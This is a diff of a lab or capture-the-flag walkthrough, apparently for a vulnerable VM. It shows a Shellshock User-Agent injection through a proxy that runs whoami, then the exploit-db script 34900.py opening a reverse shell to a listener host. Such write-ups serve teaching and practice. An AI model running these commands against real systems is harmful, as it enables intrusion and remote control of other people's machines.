@@ -92,7 +92,9 @@ To find IP address of VM:
 ### Method 3: Using shellshock
 
 #### Check if cmd works
+
 `curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"`
+
 ![](Assets/16.png)
 
 #### Searchsploit -m 34900.py
@@ -101,7 +103,9 @@ To find IP address of VM:
 > Downloaded shellshock exploit
 
 #### Python Reverse shell
+
 `Python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status`
+
 ![](Assets/18.png)
 
 > Repeat Method 2
